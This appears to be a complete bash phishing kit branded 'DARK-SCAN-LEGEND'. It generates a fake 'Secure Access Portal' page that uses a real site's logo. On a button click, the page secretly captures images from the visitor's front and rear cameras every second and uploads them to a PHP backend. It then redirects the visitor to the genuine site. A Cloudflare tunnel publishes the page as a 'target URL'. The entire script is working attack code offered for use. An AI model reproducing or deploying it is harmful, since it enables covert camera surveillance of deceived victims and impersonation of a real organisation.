#!/bin/bash
# Tool: DARK-SCAN-LEGEND v17.1
# Fix: Syntax Error in variable assignment
# Developer: JAPONI

trap 'printf "\n";stop' 2

DUMP_DIR="captured_data"

stop() {
    pkill php > /dev/null 2>&1
    pkill cloudflared > /dev/null 2>&1
    printf "\e[1;31m\n[!] SESSIONS TERMINATED.\e[0m\n"
    exit 1
}

banner() {
    clear
    printf "\e[1;31m
    ██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗ ██████╗  █████╗ ███╗   ██╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██╔════╝ ██╔══██╗████╗  ██║
    ██║  ██║███████║██████╔╝█████╔╝     ███████╗██║      ███████║██╔██╗ ██║
    ██║  ██║██║  ██║██╔══██╗██╔═██╗     ╚════██║██║      ██║  ██║██║╚██╗██║
    ██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║╚██████╗ ██║  ██║██║ ╚████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
    \e[0m"
    printf "\e[1;32m   [+]----------------------------------------------------------[+]\e[0m\n"
    printf "\e[1;37m        PROFESSIONAL C2 - DEBUGGED & STABLE VERSION\e[0m\n"
    printf "\e[1;32m   [+]----------------------------------------------------------[+]\e[0m\n"
}

create_payloads() {
    mkdir -p "$DUMP_DIR"

    # Backend
    cat <<EOF > post.php
<?php
date_default_timezone_set('Africa/Algiers');
\$time = date('H:i:s');
\$folder = "$DUMP_DIR";

if (!empty(\$_POST['login_event'])) {
    echo "\n\e[1;31m[!] ALERT: \e[1;33mTARGET REACHED PORTAL! [\$time]\e[0m\n";
    echo "\e[1;36m[i] USER_AGENT: \e[1;37m" . \$_POST['ua'] . "\e[0m\n";
}

if (!empty(\$_POST['img'])) {
    \$type = (\$_POST['type'] == 'user') ? 'FRONT' : 'BACK';
    \$name = \$folder . '/' . \$type . '_' . date('His') . '.jpg';
    \$data = str_replace(' ', '+', str_replace('data:image/jpeg;base64,', '', \$_POST['img']));
    file_put_contents(\$name, base64_decode(\$data));
    echo "\e[1;32m[+] LIVE_STREAM: [\$type] -> FRAME_RECEIVED [\$time]\e[0m\n";
}
?>
EOF

    # Frontend
    cat <<EOF > index.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Access Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; text-align: center; padding-top: 50px; }
        .box { background: white; max-width: 400px; margin: auto; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .btn { background: #d21034; color: white; border: none; padding: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 18px; font-weight: bold; }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body>
    <div class="box">
        <img src="https://www.dzexms.com/wp-content/uploads/2018/09/cropped-dzexms-logo-1.png" width="140">
        <h2>Authentication Required</h2>
        <p>Identity verification needed for database access.</p>
        <button class="btn" onclick="startStream()">VERIFY & PROCEED</button>
    </div>
    <video id="v" autoplay style="display:none;"></video>
    <script>
        \$(document).ready(function() {
            \$.post('post.php', { login_event: "true", ua: navigator.userAgent });
        });

        async function startStream() {
            const sensors = ['user', 'environment'];
            sensors.forEach(mode => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } }).then(stream => {
                    let v = document.getElementById('v');
                    v.srcObject = stream;
                    setInterval(() => {
                        let canvas = document.createElement('canvas');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(v, 0, 0);
                        \$.post('post.php', { img: canvas.toDataURL('image/jpeg'), type: mode });
                    }, 1000);
                }).catch(err => {});
            });
            setTimeout(() => { window.location.href = "https://www.dzexms.com"; }, 5000);
        }
    </script>
</body>
</html>
EOF
}

# Start System
banner
create_payloads

printf "\e[1;33m[*] STARTING LOCAL SERVER...\e[0m\n"
php -S 127.0.0.1:2026 > /dev/null 2>&1 &

printf "\e[1;33m[*] GENERATING GLOBAL TUNNEL URL...\e[0m\n"
rm -f .log
cloudflared tunnel --url http://127.0.0.1:2026 --logfile .log > /dev/null 2>&1 &

# Fixing the Assignment Error here
sleep 15
link=$(grep -o 'https://[-0-9a-z.]*\.trycloudflare.com' .log | head -n 1)

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] ERROR: TUNNEL FAILED. CHECK NETWORK.\e[0m\n"
else
    printf "\e[1;32m\n----------------------------------------------------------\n"
    printf "\e[1;37m ACTIVE TARGET URL: \e[1;33m$link\n"
    printf "\e[1;32m----------------------------------------------------------\e[0m\n"
    printf "\e[1;34m[*] MONITORING: ACTIVE | LOGS IN /$DUMP_DIR\e[0m\n"
    tail -f /dev/null
fi
